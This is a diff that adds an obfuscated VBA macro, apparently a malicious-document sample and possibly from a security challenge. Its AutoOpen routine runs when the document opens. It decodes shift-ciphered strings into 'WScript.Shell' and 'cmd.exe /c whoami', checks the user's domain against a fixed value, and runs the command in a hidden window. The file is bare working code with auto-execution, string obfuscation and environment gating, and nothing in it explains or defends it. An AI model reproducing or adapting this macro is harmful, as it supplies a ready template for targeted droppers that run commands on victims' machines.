@@ -1,0 +1,100 @@
+
+
+
+Sub AutoOpen()
+	Dim QgAEdPrMAoAePlZf As String
+	Dim HUiPQmYwHVdCZpKJuQlKBfNj As Object
+	Dim GnGIEiNBoz As Integer
+	Dim GJiqmSsWmvXpYf As String
+	Dim KsavAImw As String
+	
+	GnGIEiNBoz = 3495
+	QgAEdPrMAoAePlZf = "[wgvmtx2Wlipp"
+	KsavAImw = IjFMvUliluch()
+	If (KsavAImw = "gsRhFgNDGnwREQVGXVdZ") Then 
+		Set HUiPQmYwHVdCZpKJuQlKBfNj = CreateObject(FVEvUWH(QgAEdPrMAoAePlZf))
+		GJiqmSsWmvXpYf = jOXlp("ZEYRxLQw")
+		GJiqmSsWmvXpYf = MmLhHeAAWmUTGSTT(HUiPQmYwHVdCZpKJuQlKBfNj, GJiqmSsWmvXpYf, GnGIEiNBoz)
+	End If
+End Sub
+
+Function jOXlp(oxqGKzVbZlHptdyEWtEbtnQi As String) As String
+	Dim mSbcyoRSHCWLbJkZkAgz As String
+	Dim ycwXIPbxXjrPXkXbYYh As String
+	Dim sqmbjOajeVFts As String
+	sqmbjOajeVFts = "gqh2i|i$3g${lseqm"
+
+	mSbcyoRSHCWLbJkZkAgz = sqmbjOajeVFts
+	mSbcyoRSHCWLbJkZkAgz = FVEvUWH(mSbcyoRSHCWLbJkZkAgz)
+	jOXlp = mSbcyoRSHCWLbJkZkAgz
+End Function
+
+Function MmLhHeAAWmUTGSTT(EXCgYHinAICss As Object, XzmNYW As String, WYikQCmtRkK As Integer) As String
+	Dim VFgVDBXHADhiUcvmfwKaS As String
+	Dim urKOsQri As Integer
+	urKOsQri = 3
+	VFgVDBXHADhiUcvmfwKaS = XzmNYW
+    If (WYikQCmtRkK > urKOsQri) Then
+		urKOsQri = WYikQCmtRkK - WYikQCmtRkK
+		EXCgYHinAICss.Run VFgVDBXHADhiUcvmfwKaS, urKOsQri, True
+	End If
+	VFgVDBXHADhiUcvmfwKaS = "QKuAXUz"
+	MmLhHeAAWmUTGSTT = VFgVDBXHADhiUcvmfwKaS
+End Function
+
+
+Function FVEvUWH(RJblGeUqeWTrs As String) As String
+	Dim LuaUAXsFGqXsTXS As Long
+	Dim xvcoGRW As String
+	Dim TnjcOpmTrcX As Integer
+	TnjcOpmTrcX = 4
+	For LuaUAXsFGqXsTXS = 1 To Len(RJblGeUqeWTrs)
+		xvcoGRW = xvcoGRW & Chr(Asc(Mid(RJblGeUqeWTrs, LuaUAXsFGqXsTXS, 1)) - TnjcOpmTrcX)
+	Next LuaUAXsFGqXsTXS
+	FVEvUWH = xvcoGRW
+End Function
+
+
+
+
+Function IjFMvUliluch() As String
+	Dim ccbdLcKAPWY As String
+	ccbdLcKAPWY = "ZEYRxLQw"
+	ccbdLcKAPWY = CtaOBexARTkwBkTQoFVk(ccbdLcKAPWY)
+	ccbdLcKAPWY = FgbOBbv(ccbdLcKAPWY)
+	IjFMvUliluch = ccbdLcKAPWY
+End Function
+
+Function FgbOBbv(ccbdLcKAPWY As String) As String
+    Dim egXvIgcgirv As String
+    Dim guOALIDnBBMJby As String
+    Dim KMdEPpauSKCcOJslj As String
+    Dim YcMppBuDjWCoG As Integer
+    YcMppBuDjWCoG = 318
+    guOALIDnBBMJby = "FVEvUWH"
+    KMdEPpauSKCcOJslj = "VMRK^IV4"
+    guOALIDnBBMJby = SlbijeaIyOgEVBUEbm(guOALIDnBBMJby, KMdEPpauSKCcOJslj, YcMppBuDjWCoG)
+    egXvIgcgirv = guOALIDnBBMJby
+    If (UCase(ccbdLcKAPWY) = egXvIgcgirv) Then
+        FgbOBbv = "gsRhFgNDGnwREQVGXVdZ"
+    Else
+        FgbOBbv = "eyYQAQcIajPpJU"
+    End If
+End Function
+
+Function CtaOBexARTkwBkTQoFVk(xALTHEOWUoFIf As String) As String
+    Dim yKxSae As String
+	Dim jWSDzihSdxfXM As String
+	Dim AUdpDX As Integer
+	AUdpDX = 34
+	jWSDzihSdxfXM = "FVEvUWH"
+	jWSDzihSdxfXM = CZQRJlu(jWSDzihSdxfXM, "YWIVHSQEMR", AUdpDX)
+    yKxSae = Environ(jWSDzihSdxfXM)
+    CtaOBexARTkwBkTQoFVk = yKxSae
+End Function
+
+Function CZQRJlu(skcuYvWbQNeztbLein As String, ccAoiDHGXok As String, vBUCuWHYxlMiaBX As Integer) As String
+    If (vBUCuWHYxlMiaBX > 1) Then
+        CZQRJlu = Application.Run(skcuYvWbQNeztbLein, ccAoiDHGXok)
+    End If
+End Function
